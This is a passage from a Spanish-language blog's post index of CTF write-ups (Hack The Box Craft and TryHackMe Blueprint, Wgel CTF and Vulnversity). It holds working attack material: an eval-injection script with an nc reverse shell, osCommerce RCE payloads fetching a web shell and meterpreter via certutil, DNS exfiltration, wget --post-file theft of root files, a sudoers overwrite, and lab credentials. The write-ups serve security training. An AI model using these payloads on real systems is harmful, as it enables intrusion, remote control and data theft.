al ejecutarse. Y Ponemos a la escucha nuestra maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  #!/usr/bin/env python import requests import json response = requests.get(\u0026#39;https://api.craft.htb/api/auth/login\u0026#39;, auth=(\u0026#39;dinesh\u0026#39;, \u0026#39;4aUh0A8PbVJxgd\u0026#39;), verify=False) json_response = json.loads(response.text) token = json_response[\u0026#39;token\u0026#39;] headers = { \u0026#39;X-Craft-API-Token\u0026#39;: token, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; } # make sure token is valid response = requests.get(\u0026#39;https://api.craft.htb/api/auth/check\u0026#39;, headers=headers, verify=False) print(response.text) a = \u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;rm \\/tmp\\/f;mkfifo \\/tmp\\/f;cat \\/tmp\\/f|\\/bin\\/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.184 8878 \u0026gt;\\/tmp\\/f\u0026#39;).read()\u0026#34; # create a sample brew with real ABV... should succeed. print(\u0026#34;Create real ABV brew\u0026#34;) brew_dict = {} brew_dict[\u0026#39;abv\u0026#39;] = a brew_dict[\u0026#39;name\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;brewer\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;style\u0026#39;] = \u0026#39;bullshit\u0026#39; json_data = json.dumps(brew_dict) response = requests.post(\u0026#39;https://api.craft.htb/api/brew/\u0026#39;, headers=headers, data=json_data, verify=False) print(response.text)   Al ejecutar el script obtenemos una shell inversa:\nMYSQL - Dump Credentials Dentro del sistema de archivos encontramos los mismos archivos pertenecientes al repositorio, al ejecutar el archivo de dbtest.py obtenemos una respuesta de la base de datos MySQL.\nArchivos:\nPrueba dbtest.py\nArchivo settings.py con credenciales de la base de datos:\nPara poder obtener Credenciales que se encuentran en la base de datos utilizamos nuevamente el repositorio, ya que en este se encuentra el modelo de las tablas de la base de datos, brew y user, por lo que podemos obtener facilmente las columnas y el nombre de las tablas.\ncraft_api/database/models.py\nPara realizar un query a la base de datos utilizamos y modificamos el archivo dbtest.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  #!/usr/bin/env python import pymysql import sys from craft_api import settings connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST, user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB, cursorclass=pymysql.cursors.DictCursor) try: with connection.cursor() as cursor: sql = sys.argv[1] cursor.execute(sql) result = cursor.fetchall() print(result) finally: connection.close()   Teniendo nuestro archivo listo utilizamos el siguiente query para obtener los datos:\n1  SELECT * FROM user   Archivo dbtest.py modificado:\nObtenemos las credenciales que estan dentro de la base de datos, una de ellas ya la teniamos dentro del script test.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  [ { \u0026#39;id\u0026#39;:1, \u0026#39;username\u0026#39;:\u0026#39;dinesh\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;4aUh0A8PbVJxgd\u0026#39; }, { \u0026#39;id\u0026#39;:4, \u0026#39;username\u0026#39;:\u0026#39;ebachman\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;llJ77D8QFkLPQB\u0026#39; }, { \u0026#39;id\u0026#39;:5, \u0026#39;username\u0026#39;:\u0026#39;gilfoyle\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;ZEU3N8WNM2rh4T\u0026#39; } ]   USER gilfoyle - SHELL SSH Obtuvimos las credenciales de 3 \u0026ldquo;usuarios\u0026rdquo;, ninguno de ellos funciona en el servicio de SSH, pero dos de ellos si funcionan en la plataforma Gogs.\nPor un lado tenemos al usuario dinesh quien puede realizar cambios dentro del codigo del repositorio de la API de craft.\nCon el usuario gilfoyle nos muestra un repositorio más al del usuario dinesh este nos muestra como esta la infraestructura del \u0026lsquo;servidor\u0026rsquo;. Entre las cosas que tiene este repositorio encontramos el \u0026lsquo;craft-flask\u0026rsquo; el cual contiene la informacion para la Shell de privilegios bajos con la que pudimos obtener las credenciales, y, tambien informacion del servidor nginx, mysql, vault y ssh.\nEn la carpeta .ssh encontramos la clave publica y privada del usuario gilfoyle perteneciente al servicio de SSH, utilizamos dicha clave para obtener una shell SSH. Al utilizar la clave nos pide una frase utilizamos la contraseña (ZEU3N8WNM2rh4T) que encontramos en la base de datos de este usuario.\nObtenemos una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Nuevamente volvemos al repositorio donde encontramos la infraestructura que tiene el servidor, dentro, encontramos en la carpeta vault la configuracion de esta plataforma, esta plataforma da el acceso y control de contraseñas, certificados, claves de APIs, contraseñas, etc.\n1 2 3 4 5 6 7 8 9 10  storage \u0026#34;file\u0026#34; { path = \u0026#34;/vault/data\u0026#34; } ui = false listener \u0026#34;tcp\u0026#34; { address = \u0026#34;0.0.0.0:8200\u0026#34; tls_cert_file = \u0026#34;/vault/pki/vault.craft.htb.crt\u0026#34; tls_key_file = \u0026#34;/vault/pki/vault.craft.htb.key\u0026#34; tls_min_version = \u0026#34;tls12\u0026#34; }   Revisamos la documentacion de esta plataforma y las opciones que contiene este archivo. Encontramos que la plataforma esta corriendo en el puerto 8200 y su interfaz grafica (ui) esta desactivada. Dentro de la maquina especificamente en el archivo /etc/hosts encontramos que la plataforma esta configurada en la ip y dominio:\n1  172.20.0.2 vault.craft.htb   Comprobamos que la interfaz grafica este desactivada traemos 172.20.0.2 con el puerto 8200 localmente:\n1  ssh -L 8200:172.20.0.2:8200 gilfoyle@10.10.10.110 -i gilfoyle_id_rsa   SSH Local Pudimos comprobar que la plataforma esta desactivada graficamente.\nROOT - One Time Password One time password permite a algun usuario crear una contraseña cada vez que lo desee conectarse en el servicio SSH mediante comandos. De igual forma dentro del repositorio encontramos un archivo llamado secret.sh el cual contiene una configuracion para activar ssh, crear un Rol con el usuario root con las IP que se representen dentro de cidr_list.\nOne Time SSH\n1 2 3 4 5 6  vault secrets enable ssh vault write ssh/roles/root_otp \\ key_type=otp \\ default_user=root \\ cidr_list=0.0.0.0/0   Utilizamos el archivo secrets.sh, lo modificamos y lo ejecutamos:\n1 2 3 4 5 6  vault secrets enable ssh vault write ssh/roles/root_otp \\ key_type=otp \\ default_user=root \\ cidr_list=172.20.0.0/0   Creamos una credencial para nuestra ip con el rol de root_otp.\n1  vault write ssh/creds/root_otp ip=172.20.0.1   Cuando creamos nuestra credencial nos muestra los detalles:\nUtilizamos la clave (key) como contraseña:\nkey: 70a2c9bc-4644-8bbd-f010-0c08193a3b7f Nos conectamos mediante ssh al usuario root localmente (0.0.0.0):\nssh root@0.0.0.0 Obtenemos una shell como usuario root y nuestra flag root.txt:\n","description":"Craft presenta Gogs donde encontramos el codigo fuente y una vulnerabilidad en una API la cual explotamos para ejecutar una shell inversa. Utilizando credenciales de la base de datos nos conectamos a esta y obtuvimos credenciales para realizar movimiento lateral. Con informacion de los repositorios y de la base de datos obtuvimos acceso al siguiente usuario. El repositorio de Infraestructura nos permitio obtener acceso privilegiado con la informacion de Vault.","id":118,"section":"posts","tags":["eval","python","vault","api","gogs"],"title":"Hack The Box - Craft","uri":"https://sckull.github.io/posts/craft/"},{"content":"  Blueprint es una maquina de TryHackMe, encontramos osCommerce con multiples vulnerabilidades, explotamos un RCE para descargar una web shell que luego actualizamos a una sesion de meterpreter con acceso privilegiado.\nRoom    Titulo Blueprint      Descripción Hack into this Windows machine and escalate your privileges to Administrator.   Puntos 110   Dificultad Facil   Maker MrSeth6797     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80  root@aoiri:~/tryhackme/blueprint# masscan -p1-65535,U:1-65535 blueprint.thm -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-13 06:32:11 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49154/tcp on blueprint.thm Discovered open port 49159/tcp on blueprint.thm Discovered open port 137/udp on blueprint.thm Discovered open port 135/tcp on blueprint.thm Discovered open port 8080/tcp on blueprint.thm Discovered open port 139/tcp on blueprint.thm Discovered open port 3306/tcp on blueprint.thm Discovered open port 49152/tcp on blueprint.thm Discovered open port 445/tcp on blueprint.thm Discovered open port 49160/tcp on blueprint.thm Discovered open port 49153/tcp on blueprint.thm Discovered open port 49155/tcp on blueprint.thm Discovered open port 443/tcp on blueprint.thm # Nmap 7.80 scan initiated Fri Dec 13 00:33:25 2019 as: nmap -sV -sC -o nmap_scan blueprint.thm Nmap scan report for blueprint.thm (blueprint.thm) Host is up (0.23s latency). Not shown: 987 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: 404 - File or directory not found. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 |_http-title: Bad request! | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) 8080/tcp open http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 |_http-title: Index of / 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 0s, deviation: 1s, median: 0s |_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:a9:aa:22:09:2e (unknown) | smb-os-discovery: | OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1 | Computer name: BLUEPRINT | NetBIOS computer name: BLUEPRINT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2019-12-13T06:35:06+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-12-13T06:35:05 |_ start_date: 2019-12-13T06:32:08 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Dec 13 00:35:22 2019 -- 1 IP address (1 host up) scanned in 116.94 seconds   HTTP Encontramos que en el puerto 8080 esta corriendo osCommerce.\nGOBUSTER Utilzamos gobuster en el directorio de oscommers para buscar archivos que puedan ser de utilidad.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  root@aoiri:~/tryhackme/blueprint# gobuster dir -u http://blueprint.thm:8080/oscommerce-2.3.4/catalog/ -x php,html,txt,aspx,asp -t 15 -q -w /usr/share/wordlists/dirb/common.txt /account_history.php (Status: 302) /account_edit.php (Status: 302) /ADMIN (Status: 301) /admin (Status: 301) /Admin (Status: 301) /advanced_search.php (Status: 200) /com2 (Status: 403) /com2.php (Status: 403) /com2.html (Status: 403) /com2.txt (Status: 403) /com2.aspx (Status: 403) /com2.asp (Status: 403) /com3 (Status: 403) /com3.aspx (Status: 403) /com3.asp (Status: 403) /com3.php (Status: 403) /com3.html (Status: 403) /com3.txt (Status: 403) /conditions.php (Status: 200) /contact_us.php (Status: 200) /cookie_usage.php (Status: 200) /Download (Status: 401) /Download.php (Status: 200) /download (Status: 401) /download.php (Status: 200) /ext (Status: 301) /images (Status: 301) /Images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /Index.php (Status: 200) /Login.php (Status: 200) /login.php (Status: 200) /lpt1 (Status: 403) /lpt1.txt (Status: 403) /lpt1.aspx (Status: 403) /lpt1.asp (Status: 403) /lpt1.php (Status: 403) /lpt1.html (Status: 403) /lpt2 (Status: 403) /lpt2.php (Status: 403) /lpt2.html (Status: 403) /lpt2.txt (Status: 403) /lpt2.aspx (Status: 403) /lpt2.asp (Status: 403) /nul (Status: 403) /nul.php (Status: 403) /nul.html (Status: 403) /nul.txt (Status: 403) /nul.aspx (Status: 403) /nul.asp (Status: 403) /opensearch.php (Status: 200) /popup_image.php (Status: 200) /prn (Status: 403) /prn.php (Status: 403) /prn.html (Status: 403) /prn.txt (Status: 403) /prn.aspx (Status: 403) /prn.asp (Status: 403) /product_reviews.php (Status: 302) /products_new.php (Status: 200) /pub (Status: 301) /redirect.php (Status: 302) /reviews.php (Status: 200) /shipping.php (Status: 200) /shopping_cart.php (Status: 200) /specials.php (Status: 200) /ssl_check.php (Status: 200) /tell_a_friend.php (Status: 302)   SEARCSPLOIT Con el nombre y la version de oscommerce encontramos varias vulnerabilidades y exploits que afectan a esta plataforma.\nosCommerce 2.3.4.1 - Remote Code Execution Utilizamos el exploit Remote Code Execution, nos permitira ejecutar comandos en el sistema, pero para ello debemos de configurar la ruta de la maquina en el exploit, de igual forma el payload que ejecuta una shell inversa no funciona ya que es un sistema windows.\nPara poder ver el resultado de la ejecucion de nuestro comando podemos utilizar la tecnica de DNS exfil (y por los loles xd).\nNuestro payload se veria de la siguiente forma si deseamos ver el path donde estamos actualmente.\n1  cmd.exe /C cd c:/ \u0026amp; 10.8.1.72 \u0026amp; for /f %i in (\\\u0026#39; @echo %cd% \\\u0026#39;) do nslookup %i 10.8.1.72   Con la configuracion (IP, Puerto y directorio de la plataforma) realizada, podemos correr responder en la interfaz tun0, y al lanzar nuestro exploit nos aparecera la ruta en una solicitud de DNS de responder.\nVemos que desordenada la informacion pero el path actual es:\nC:/xampp/htdocs/oscommerce.2.3.4/catalog/install/includes/ Sabiendo esto podemos verificar si podemos escribir y crear dentro de archivos con el payload:\n1 2 3 4  payload = \u0026#39;\\\u0026#39;);\u0026#39; payload += \u0026#39;$var = shell_exec(\u0026#34;cmd.exe /C echo \\\u0026#39;hello\\\u0026#39; \u0026gt; hehe.txt \u0026amp; nslookup test 10.8.1.72 \u0026#34;);\u0026#39; payload += \u0026#39;echo $var;\u0026#39; payload += \u0026#39;/*\u0026#39;   Vemos que que el archivo se creó exitosamente:\nUtilizamos este pequeño codigo php para ejecutar comandos, lo alojamos en nuestra maquina y levantamos un servidor web con python3:\n1  \u0026lt;?php echo shell_exec($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;   Nuestro payload para descargar el archivo en la maquina utilizando certutil:\n1 2 3 4  payload = \u0026#39;\\\u0026#39;);\u0026#39; payload += \u0026#39;$var = shell_exec(\u0026#34;cmd.exe /C certutil -urlcache -split -f http://10.8.1.72/shell.php shell.php \u0026amp; nslookup test 10.8.1.72 \u0026#34;);\u0026#39; payload += \u0026#39;echo $var;\u0026#39; payload += \u0026#39;/*\u0026#39;   Vemos nuestro archivo y ejecutamos comandos:\nTenemos permisos de administrador en la maquina y podemos ver la direccion actual en la que nos encontramos, de igual forma podemos leer nuestra bandera que se encuentra en el directorio del usuario administrator.\nShell - Metasploit Utilizando metasploit con certutil podemos obtener una shell y sacar el archivo que contiene los hash de los usuarios en windows para ello vamos a crear nuestro payload con msfvenom y poner a la escucha metasploit.\nMsfvenom:\n1  msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=1338 -f exe \u0026gt; shell.exe   Metasploit:\n1 2 3 4 5  use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost tun0 set lport 1338 exploit   Payload - exploit osCommerce:\n1 2 3 4  payload = \u0026#39;\\\u0026#39;);\u0026#39; payload += \u0026#39;$var = shell_exec(\u0026#34;cmd.exe /C certutil.exe -urlcache -split -f http://10.8.1.72/shell.exe shell.exe \u0026amp; shell.exe \u0026amp; nslookup test 10.8.1.72 \u0026#34;);\u0026#39; payload += \u0026#39;echo $var;\u0026#39; payload += \u0026#39;/*\u0026#39;   Obtuvimos una sesion meterpreter:\nPara obtener los hash utilizamos el comando hashdump, los cuales podemos crackear utilizando john o hashcat:\n","description":"Blueprint es una maquina de TryHackMe, encontramos osCommerce con multiples vulnerabilidades, explotamos un RCE para descargar una web shell que luego actualizamos a una sesion de meterpreter con acceso privilegiado.","id":119,"section":"posts","tags":["osCommerce 2.3.4.1","DNS exfil","metasploit"],"title":"TryHackMe - Blueprint","uri":"https://sckull.github.io/posts/blueprint/"},{"content":"  Wgel CTF es una maquina de TryHackMe, tras enumerar el sitio web encontramos una clave privada que nos dio acceso por SSH. Escalamos privilegios modificando el archivo sudoers con Wget.\nRoom    Titulo Wgel CTF      Descripción Can you exfiltrate the root flag?   Puntos 110   Dificultad Facil   Maker MrSeth6797     NMAP Escaneo de puertos tcp, vemos dos puertos abiertos http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  # Nmap 7.80 scan initiated Fri Dec 27 19:44:55 2019 as: nmap -p- --min-rate 1000 -o scannmap 10.10.116.173 Nmap scan report for 10.10.116.173 Host is up (0.20s latency). Not shown: 65533 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Fri Dec 27 19:46:23 2019 -- 1 IP address (1 host up) scanned in 87.39 seconds Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-27 19:47 CST Nmap scan report for 10.10.116.173 Host is up (0.43s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA) | 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA) |_ 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.86 seconds   HTTP En el puerto 80 esta corriendo apache.\nAnalizamos el codigo fuente del index de apache y econtramos un comentario que no es comun en el index de apache.\nGOBUSTER Escaneo de directorios y archivos con gobuster.\n1 2 3 4 5  root@aoiri:~/tryhackme/wgel_ctf# gobuster dir -u http://10.10.116.173/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt -q /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) /sitemap (Status: 301)   Pagina web en /sitemap/ Nuevamente hacemos un escaneo con gobuster pero ahora a la pagina que encontramos (/sitemap/).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  root@aoiri:~/tryhackme/wgel_ctf# gobuster dir -u http://10.10.116.173/sitemap/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt -q /.ssh (Status: 301) /about.html (Status: 200) /blog.html (Status: 200) /contact.html (Status: 200) /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /services.html (Status: 200) /shop.html (Status: 200) /work.html (Status: 200) root@aoiri:~/tryhackme/wgel_ctf#   Encontramos un directorio (/.ssh) donde se encuentra una clave privada de ssh.\nSSH - Jessie Iniciamos session con Jessie y la clave privada que encontramos anteriormente, obtenemos una shell ssh y nuestra primera flag user_flag.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y encomtramos que podemos correr el comando wget.\nPara obtener nuestra segunda flag utilizamos wget con el parametro --post-file con la ruta del archivo y hacia la IP donde queremos enviar el archivo. Ponemos a la escucha netcat (local) en el puerto 80.\nComando:\n1  sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.8.1.72   Netcat con la flag root_flag.txt.\nROOT SHELL Para obtener una shell con privilegios de administracion primero obtenemos el archivo /etc/sudoers mediante la misma forma que con la flag, editamos el archivo sudoers localmente agregando nuestra propia configuracion para el usuario Jessio.\nCambiamos esta linea por la segunda en el archivo:\n1 2  #jessie ALL=(root) NOPASSWD: /usr/bin/wget jessie ALL=(ALL) NOPASSWD: ALL   Una vez hecho esto levantamos un servidor con python3 en la ruta donde se encuentra nuestro archivo sudoers.\nY en la maquina wgel ejecutamos el comando wget con sudo el cual va a sobreescribir el archivo /etc/sudoers.\nNos ubicamos en la carpeta /etc/ y ejecutamos:\n1  sudo /usr/bin/wget 10.8.1.72/sudoers --output-document=sudoers   Verificamos con el comando sudo -l -l que la configuracion haya cambiado.\nEjecutamos el comando sudo su y obtenemos una shell con privilegios root.\n","description":"Wgel CTF es una maquina de TryHackMe, tras enumerar el sitio web encontramos una clave privada que nos dio acceso por SSH. Escalamos privilegios modificando el archivo sudoers con Wget.","id":120,"section":"posts","tags":[],"title":"TryHackMe - Wgel CTF","uri":"https://sckull.github.io/posts/wgel/"},{"content":"  Vulnversity es una maquina de TryHackMe, es una maquina del PATH de Complete Beginner, aca se muestra la solucion para cada una de las secciones.\nRoom    Titulo Vulnversity      Descripción Learn about active recon, web app attacks and privilege escalation.   Puntos 368   Dificultad Facil   Maker tryhackme     { Reconnaissance } Comenzamos desde esta tarea, la primera es desplegar nuestra maquina. En esta tarea utilizamos nmap una herramienta para realizar un escaneo de hosts, puertos, servicios y ejecutar scripts en una red.\n   nmap flag Descripcion     -sv Determina la version del servicio   -p  or -p- Escanea el puerto x o escanea todos los puertos   -Pn Solo escanea puertos abiertos y no hosts   -A Determina la version del SO y ejecuta scripts   -sC Escanea con scripts por default   -v Verbosidad   -sU Puertos UDP   -sS Puertos TCP    Info From Vulnersity room.\nNMAP Comenzamos escaneando todos los puertos tcp y servicios disponibles en el host y guardar el reporte en un archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  # Nmap 7.80 scan initiated Wed Dec 25 15:31:22 2019 as: nmap -sS -T4 -sV -p- -o nmap_scan 10.10.193.246 Nmap scan report for 10.10.193.246 Host is up (0.17s latency). Not shown: 65529 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 3128/tcp open http-proxy Squid http proxy 3.5.12 3333/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 25 15:45:34 2019 -- 1 IP address (1 host up) scanned in 851.97 seconds   { Locating directories using GoBuster } Utilizamos GoBuster para escanear directorios y archivos en la pagina web que esta corriendo en el puerto 3333.\n   GoBuster flag Descripcion     -e Imprime la URL completa   -u La url Objetivo   -w Direccion del wordlist   -U y -P usuario y constraseña para autenticacion   -p  Proxy para las peticiones   -c Especifica el cookie para autenticacion    Info From Vulnersity room.\nGOBUSTER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  root@aoiri:~# gobuster dir -u http://10.10.193.246:3333 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.193.246:3333 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/12/25 15:56:20 Starting gobuster =============================================================== /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /internal (Status: 301) /js (Status: 301) /server-status (Status: 403) =============================================================== 2019/12/25 15:58:19 Finished ===============================================================   Realizamos un escaneo al directorio /internal/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  root@aoiri:~/tryhackme/www# gobuster dir -u http://10.10.193.246:3333/internal/ -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.193.246:3333/internal/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/12/25 16:15:40 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /css (Status: 301) /index.php (Status: 200) /uploads (Status: 301) =============================================================== 2019/12/25 16:17:19 Finished ===============================================================   { Compromise the webserver } El directorio /internal nos muestra una pagina donde podemos subir archivos.\nAl intentar subir un archivo con extension .php, .txt, .jpg nos muestra un mensaje de error.\nBURPSUITE Utilizamos burpsuite para poder capturar la solicitud que hacemos al enviar el archivo, cambiando la extension y enviarla nuevamente con diferentes extenciones las cuales puedan ser interpretadas por php.\nOWASP - Unrestricted File Upload\nUtilizamos una shell inversa que nos trae Kali Linux (/usr/share/webshells/php/php-reverse-shell.php) cambiamos la ip y el hacia donde va la shell. Intentamos subir este archivo y capturamos la solicitud con burpsuite.\nEnviamos la solicitud a Intruder, agregamos un marcador de payload a la extension del archivo para poder hacer la misma solicitud pero con diferente extension.\nEn la pestaña de payloads agregamos las extensiones que vamos a utilizar.\n1 2 3 4 5  .php4 .php5 .pht .phtml .ini   Comenzamos el \u0026lsquo;Ataque\u0026rsquo;, al finalizar vemos que una de las solicitudes fue exitosa con la extension .phtml.\nRevisamos la pagina de /internal/uploads/ y vemos que nuestro archivo esta ahora en el servidor.\nVisitamos nuestro archivo para que se ejecute y obtenemos una shell.\n{ Privilege Escalation } Ahora que tenemos una shell en la maquina podemos buscar una manera para poder obtener permisos root, comenzamos enumerando los archivos SUID con find.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  $ find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah -rwsr-xr-x 1 root root 31K Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 40K May 16 2018 /bin/mount -rwsr-xr-x 1 root root 139K Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 40K May 16 2017 /bin/su -rwsr-xr-x 1 root root 645K Feb 13 2019 /bin/systemctl -rwsr-xr-x 1 root root 27K May 16 2018 /bin/umount -rwsr-xr-x 1 root root 35K Mar 6 2017 /sbin/mount.cifs -rwsr-sr-x 1 daemon daemon 51K Jan 14 2016 /usr/bin/at -rwsr-xr-x 1 root root 49K May 16 2017 /usr/bin/chfn -rwsr-xr-x 1 root root 40K May 16 2017 /usr/bin/chsh -rwsr-xr-x 1 root root 74K May 16 2017 /usr/bin/gpasswd -rwsr-xr-x 1 root root 33K May 16 2017 /usr/bin/newgidmap -rwsr-xr-x 1 root root 39K May 16 2017 /usr/bin/newgrp -rwsr-xr-x 1 root root 33K May 16 2017 /usr/bin/newuidmap -rwsr-xr-x 1 root root 53K May 16 2017 /usr/bin/passwd -rwsr-xr-x 1 root root 23K Jan 15 2019 /usr/bin/pkexec -rwsr-xr-x 1 root root 134K Jul 4 2017 /usr/bin/sudo -rwsr-xr-- 1 root messagebus 42K Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 27 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 419K Jan 31 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 15K Jan 15 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-sr-x 1 root root 97K Jan 29 2019 /usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 75K Jul 17 11:22 /usr/lib/squid/pinger -rwsr-xr-x 1 root root 39K Jun 14 2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic   Podemos observar que entre los binarios se encuentra systemctl, por lo cual vamos a utilizarlo para obtener privilegios root, con los siguientes comandos.\nGTFOBINS - Systemctl\nPrimero creamos un archivo el cual va ejecutar una shell inversa:\n1  echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat 